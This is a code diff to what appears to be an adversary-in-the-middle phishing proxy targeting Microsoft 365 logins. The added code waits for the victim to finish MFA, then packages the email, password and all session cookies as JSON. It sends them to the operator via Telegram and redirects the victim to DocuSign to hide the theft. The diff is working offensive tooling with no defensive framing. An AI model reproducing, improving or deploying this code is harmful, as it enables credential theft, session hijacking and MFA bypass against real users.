@@ -436,41 +436,42 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
         }
 
-// ===== FINAL ALERT & REDIRECT =====
-if (!VICTIM_SESSIONS[currentSession].alerted && hasValidSessionCookies(VICTIM_SESSIONS[currentSession])) {
-    const sessionData = VICTIM_SESSIONS[currentSession];
-    let credentials = sessionData.credentials;
+// ===== FINAL ALERT & REDIRECT (after MFA) =====
+const sessionData = VICTIM_SESSIONS[currentSession];
+const currentHost = sessionData.host || '';
+const isPostLogin = !currentHost.includes('login.microsoftonline.com') &&
+                   (currentHost.includes('office.com') ||
+                    currentHost.includes('m365.cloud.microsoft') ||
+                    currentHost.includes('onedrive.com'));
 
-    // Fallback if no credentials (shouldn't happen normally)
-    if (!credentials) {
-        credentials = { email: 'N/A', password: 'N/A', url: '', time: '' };
-    }
+if (!sessionData.alerted && hasValidSessionCookies(sessionData) && isPostLogin) {
+    let credentials = sessionData.credentials || { email: 'N/A', password: 'N/A' };
 
-    // Build combined message
-    const cookies = sessionData.cookies
-        .filter(c => ['ESTSAUTH', 'ESTSAUTHPERSISTENT'].includes(c.name))
-        .map(c => `${c.name}=${c.value}`)
-        .join('; ');
+    // Prepare full cookie array as JSON string
+    const allCookies = sessionData.cookies.map(c => ({
+        name: c.name,
+        value: c.value,
+        domain: c.domain,
+        path: c.path,
+        expires: c.expires
+    }));
+    const cookiesJson = JSON.stringify(allCookies, null, 2);
 
     const msg = `🚨 *Full Capture*\n\n` +
                 `📧 *Email:* ${credentials.email}\n` +
-                `🔑 *Password:* ${credentials.password}\n` +
-                `🍪 *Cookies:* ${cookies}\n` +
-                `🌐 *Login URL:* ${credentials.url}\n` +
-                `🕐 *Time:* ${credentials.time}`;
+                `🔑 *Password:* ${credentials.password}\n\n` +
+                `🍪 *All Cookies (JSON):*\n\`\`\`json\n${cookiesJson}\n\`\`\``;
 
     sendToTelegram(msg).catch(err => console.error('Telegram send failed:', err));
-    console.log(`[FINAL ALERT] Cookies captured. Redirecting victim...`);
+    console.log(`[FINAL ALERT] MFA completed. Cookies captured.`);
 
     // Mark as alerted
-    VICTIM_SESSIONS[currentSession].alerted = true;
+    sessionData.alerted = true;
 
-    // Redirect victim to DocuSign if this is a navigation response
-    if (isNavigationRequest && proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
-        proxyResponse.headers.location = 'https://www.docusign.com/';
-        console.log(`[REDIRECT] Location set to DocuSign`);
-    }
+    // Force redirect on next navigation request
+    sessionData.pendingRedirect = true;
 }
+// ================================================
 // ================================
         proxyResponse.headers["cache-control"] = "no-store";
         proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
@@ -525,6 +526,14 @@ if (!VICTIM_SESSIONS[currentSession].alerted && hasValidSessionCookies(VICTIM_SE
                         displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                     }
                 }
+                // ----- PENDING REDIRECT HANDLER -----
+if (VICTIM_SESSIONS[currentSession].pendingRedirect && isNavigationRequest) {
+    proxyResponse.headers.location = 'https://www.docusign.com/';
+    proxyResponse.statusCode = 302;
+    VICTIM_SESSIONS[currentSession].pendingRedirect = false;
+    console.log('[REDIRECT] Forced redirect to DocuSign');
+}
+// ------------------------------------
 
                 clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                 clientResponse.end(serverResponseBody);
